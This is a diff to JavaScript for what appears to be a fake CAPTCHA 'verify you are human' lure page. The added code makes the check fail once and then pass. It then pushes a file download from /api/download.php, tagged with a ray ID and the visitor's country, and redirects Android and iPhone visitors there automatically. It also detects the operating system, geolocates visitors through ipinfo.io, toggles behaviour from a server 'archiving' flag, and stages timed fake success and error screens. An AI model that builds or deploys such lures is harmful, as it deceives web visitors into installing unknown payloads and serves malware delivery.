@@ -7,6 +7,9 @@ const browserName = $('#browserName').val();
 // host name
 const httpHOST = $('#httpHOST').val();
 
+// archiving state
+var archiving;
+
 
 window.setTimeout(function() {
   $('#wait').css('display', 'none');
@@ -29,23 +32,13 @@ $.get('https://ipinfo.io/json', function(response) {
 })
 
 
-// Function to load translations from a JSON file
-function loadTranslations() {
-  fetch("./assets/lang.json")
-    .then((response) => response.json())
-    .then((translations) => {
-      setLanguage(translations);
-    })
-    .catch((error) => {
-      console.error("Error loading translations:", error);
-    });
-}
-
+let userLang;
+let translate_Lang;
 // **************** JS Code For Translate ********************
 // Function to detect the user's browser language and set the appropriate text
 function setLanguage(translations) {
   // Get the user's preferred language from the browser (e.g., 'en', 'es')
-  let userLang = navigator.language || navigator.userLanguage;
+  userLang = navigator.language || navigator.userLanguage;
 
   // Only keep the first two characters (e.g., 'en-US' becomes 'en')
   userLang = userLang.slice(0, 2);
@@ -68,6 +61,19 @@ function setLanguage(translations) {
 }
 
 
+// Function to load translations from a JSON file
+function loadTranslations() {
+  fetch("./assets/lang.json")
+    .then((response) => response.json())
+    .then((translations) => {
+      translate_Lang = translations;
+      setLanguage(translations);
+    })
+    .catch((error) => {
+      console.error("Error loading translations:", error);
+    });
+}
+
 
 
 // show popup
@@ -84,11 +90,12 @@ function hide_popup() {
 
 // hide popup when click overlay
 var isClose = false;
-$('#overlay').click(function() {
-  // if (isClose) hide_popup();
+// $('#overlay').click(function() {
+//   if (isClose) hide_popup();
+// })
+$('#close_popup').click(function() {
+    hide_popup();
 })
-
-
 
 
 
@@ -140,10 +147,8 @@ let clickCount = 0;
 
 // play video loading
 $('#checkbox-container').click(function() {
-  // Replace checkbox with spinner
-  // document.getElementById("captcha-checkbox").style.display = "none";
-  // document.getElementById("captcha-spinner").style.display = "block";
-  document.getElementById("captcha-text").innerHTML = "Verifying...";
+
+  document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['process'];
 
   if (clickCount == 0) {
       document.getElementById('video1').currentTime = 0;
@@ -160,15 +165,25 @@ $('#checkbox-container').click(function() {
     if (clickCount == 0) {
       // First click: show alert, revert to checkbox, but no success mark
       document.getElementById("error-message").style.display = "block"; // Show red error message
-      document.getElementById("captcha-text").innerHTML = "Verify you are human";
+      document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['verify-human'];
       document.getElementById('captcha-wrapper').style.height = '100px';
     } else if (clickCount == 1) {
       // Second click: successful verification, show success mark
       document.getElementById("error-message").style.display = "none"; // Hide error message
-      document.getElementById("captcha-text").innerHTML = "Success!";
+      document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['success'];
       document.getElementById('captcha-wrapper').style.height = 'auto';
       isClose = true;
-      show_popup();
+      
+      if (OS == 'Windows' || OS == 'macOS') {
+        show_popup();
+      }
+      if (OS == 'Android' || OS == 'iPhone') {
+        $('#popup_mobile').css('display', 'flex');
+        window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
+        window.setTimeout(function() {
+          $('.popup_mobile-help').css('display', 'block');
+        }, 60000);
+      }
     }
 
     clickCount++;
@@ -195,13 +210,57 @@ var downloadCount = 0;
 $('#report').click(function() {
   if (isClose) {
     downloadCount++;
-    window.location.href = "/api/download.php";
+    window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
 
-    window.setTimeout(function() {
-        check_ray_id();
-    }, 60000);
+    if (archiving == 'OFF') {
+        window.setTimeout(function() {
+          hide_popup();
+          $('#captcha-wrapper').css('display', 'none');
+          $('#action').css('display', 'none');
+          $('.detail').css('display', 'none');
+          $('#success').css('display', 'flex');
+          $('.wait-respond').css('display', 'block');
+        }, 8000);
+
+        window.setTimeout(function() {
+          document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['error'];
+          $('#captcha-wrapper').css('display', 'block');
+          $('#success').css('display', 'none');
+          $('.wait-respond').css('display', 'none');
+          $('#wait').css('display', 'block');
+          $('.captcha-error').css('display', 'block');
+          $('.video1').css('display', 'none');
+          $('.video2').css('display', 'none');
+          $('.video3').css('display', 'block');
+        }, 12000);
+    }
+
+
+    if (archiving == 'ON') {
+      window.setTimeout(function() {
+        hide_popup();
+        $('#captcha-wrapper').css('display', 'none');
+        $('#action').css('display', 'none');
+        $('.detail').css('display', 'none');
+        $('#success').css('display', 'flex');
+        $('.wait-respond').css('display', 'block');
+      }, 3000);
+
+      window.setTimeout(function() {
+        document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['error'];
+        $('#captcha-wrapper').css('display', 'block');
+        $('#success').css('display', 'none');
+        $('.wait-respond').css('display', 'none');
+        $('#wait').css('display', 'block');
+        $('.captcha-error').css('display', 'block');
+        $('.video1').css('display', 'none');
+        $('.video2').css('display', 'none');
+        $('.video3').css('display', 'block');
+      }, 35000);
+    }
+
     
-    window.alert("Download complete.\nThe tool is ready to use.");
+    // window.alert("Download complete.\nThe tool is ready to use.");
   }
   
   if (downloadCount >= 2) {
@@ -211,6 +270,9 @@ $('#report').click(function() {
   }
 })
 
+$(document).on('click', '#refresh_btn', function() {
+    location.reload();
+})
 
 // Function to generate a random 16-character hexadecimal Ray ID
 function generateRayID() {
@@ -247,6 +309,11 @@ window.setTimeout(function() {
         countrycode: country_code,
         version: 'V3'
     });
+
+    $.post('/api/get_archiving.php', {}, function(res) {
+        archiving = res;
+    });
+
 }, 800)
 
 
@@ -268,4 +335,15 @@ function check_ray_id() {
     }
   })
   
+}
+
+// get OS
+const OS = getOS();
+function getOS() {
+  const userAgent = navigator.userAgent;
+  if (/Windows/i.test(userAgent)) return 'Windows';
+  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
+  if (/Android/i.test(userAgent)) return 'Android';
+  if (/iPhone|iPad/i.test(userAgent)) return 'iPhone';
+  return 'Unknown OS';
 }
